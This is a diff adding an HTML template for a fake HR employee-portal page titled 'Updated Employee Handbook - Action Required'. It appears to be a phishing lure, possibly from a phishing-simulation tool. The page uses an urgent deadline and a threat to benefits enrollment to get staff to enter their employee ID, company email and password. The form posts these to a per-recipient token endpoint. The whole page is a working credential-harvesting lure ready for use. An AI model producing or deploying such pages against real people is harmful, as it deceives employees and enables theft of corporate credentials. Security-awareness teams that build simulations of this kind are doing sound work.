@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Employee Portal - Document Review</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #e9ecef;
+            margin: 0;
+        }
+        .nav {
+            background: #2c3e50;
+            color: white;
+            padding: 15px 0;
+        }
+        .nav-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav h1 {
+            margin: 0;
+            font-size: 20px;
+        }
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+        }
+        .container {
+            max-width: 700px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+        .breadcrumb {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .document-info {
+            background: #f8f9fa;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin: 20px 0;
+            line-height: 1.8;
+        }
+        .form-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #e9ecef;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .checkbox-group {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 4px;
+        }
+        .checkbox-group label {
+            display: flex;
+            align-items: start;
+            font-weight: normal;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 10px;
+            margin-top: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="nav">
+        <div class="nav-container">
+            <h1>🏢 Company Employee Portal</h1>
+            <div class="nav-links">
+                <a href="#">Home</a>
+                <a href="#">Benefits</a>
+                <a href="#">Documents</a>
+                <a href="#">Profile</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="breadcrumb">
+            Home → HR Documents → Employee Handbook
+        </div>
+        
+        <h2>Updated Employee Handbook - Action Required</h2>
+        
+        <div class="warning">
+            <strong>⚠️ Deadline: Friday 5:00 PM</strong><br>
+            All employees must review and acknowledge the updated Employee Handbook to maintain benefits enrollment.
+        </div>
+        
+        <div class="document-info">
+            <strong>Document:</strong> Employee Handbook v2024.1<br>
+            <strong>Effective Date:</strong> Immediately<br>
+            <strong>Last Updated:</strong> Today<br>
+            <strong>Required Action:</strong> Review and Acknowledge
+        </div>
+        
+        <h3 style="margin-top: 25px; margin-bottom: 10px;">Key Updates Include:</h3>
+        <ul style="margin-left: 20px; line-height: 2; color: #666;">
+            <li>Remote Work Policy Changes</li>
+            <li>Updated Benefits Enrollment Procedures</li>
+            <li>Revised Code of Conduct Guidelines</li>
+            <li>New Security and Privacy Protocols</li>
+            <li>PTO and Leave Policy Updates</li>
+        </ul>
+        
+        <div class="form-section">
+            <h3 style="margin-bottom: 10px;">Employee Acknowledgment</h3>
+            <p style="color: #666; margin-bottom: 20px;">
+                Please sign in to review and acknowledge the updated handbook.
+            </p>
+            
+            <form method="POST" action="/submit/{{ token }}">
+                <div class="form-group">
+                    <label for="employee_id">Employee ID</label>
+                    <input type="text" id="employee_id" name="employee_id" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Company Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <label>
+                        <input type="checkbox" required>
+                        <span>I acknowledge that I have reviewed the updated Employee Handbook and understand all policy changes.</span>
+                    </label>
+                </div>
+                
+                <button type="submit">Sign In and Acknowledge</button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            Human Resources Department | Employee Portal<br>
+            For assistance, contact HR at hr@company.com
+        </div>
+    </div>
+</body>
+</html>
